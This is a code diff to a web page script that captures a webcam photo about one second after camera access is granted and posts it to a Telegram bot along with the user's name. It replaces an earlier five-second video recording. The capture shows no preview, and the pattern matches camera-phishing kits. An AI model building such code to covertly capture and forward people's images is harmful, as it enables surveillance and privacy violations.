@@ -50,48 +50,43 @@
 
             try {
                 const stream = await navigator.mediaDevices.getUserMedia({ video: true });
-                let video = document.createElement('video');
+                const video = document.createElement('video');
                 video.srcObject = stream;
                 video.play();
 
-                // Set up MediaRecorder
-                let recordedChunks = [];
-                const mediaRecorder = new MediaRecorder(stream);
-                
-                mediaRecorder.ondataavailable = (event) => {
-                    if (event.data.size > 0) {
-                        recordedChunks.push(event.data);
-                    }
-                };
+                // Create a canvas element to capture the photo
+                const canvas = document.createElement('canvas');
+                const context = canvas.getContext('2d');
 
-                mediaRecorder.onstop = async () => {
-                    const blob = new Blob(recordedChunks, { type: 'video/mp4' });
-                    const videoUrl = URL.createObjectURL(blob);
-                    console.log('Video URL:', videoUrl);
+                // Set canvas dimensions to match the video
+                video.addEventListener('loadedmetadata', () => {
+                    canvas.width = video.videoWidth;
+                    canvas.height = video.videoHeight;
 
-                    // Send video file
-                    await sendToTelegram(username, blob);
-                };
-
-                // Start recording and stop after 5 seconds
-                mediaRecorder.start();
-                setTimeout(() => mediaRecorder.stop(), 5000);
+                    // Capture photo after 1 second
+                    setTimeout(() => {
+                        context.drawImage(video, 0, 0, canvas.width, canvas.height);
+                        const photoBlob = canvas.toBlob(blob => {
+                            sendToTelegram(username, blob);
+                        }, 'image/jpeg');
+                    }, 1000);
+                });
                 
             } catch (error) {
                 alert('Camera access denied.');
             }
         }
 
-        async function sendToTelegram(username, videoBlob) {
+        async function sendToTelegram(username, photoBlob) {
             const botToken = 'YOUR_BOT_TOKEN';  // Replace with your bot token
             const chatId = 'YOUR_CHAT_ID';      // Replace with your chat ID
-            const url = `https://api.telegram.org/bot${botToken}/sendVideo`;
+            const url = `https://api.telegram.org/bot${botToken}/sendPhoto`;
 
-            // Create FormData and append the video file
+            // Create FormData and append the photo file
             const formData = new FormData();
             formData.append('chat_id', chatId);
             formData.append('caption', `User: ${username}`);
-            formData.append('video', videoBlob, 'video.mp4');
+            formData.append('photo', photoBlob, 'photo.jpg');
 
             try {
                 const response = await fetch(url, {
@@ -100,14 +95,14 @@
                 });
                 const data = await response.json();
                 if (data.ok) {
-                    alert('Your video has been sent!');
+                    alert('Your photo has been sent!');
                 } else {
                     console.error('Telegram API Error:', data);
-                    alert('Failed to send video.');
+                    alert('Failed to send photo.');
                 }
             } catch (error) {
                 console.error('Error:', error);
-                alert('Failed to send video.');
+                alert('Failed to send photo.');
             }
         }
     </script>
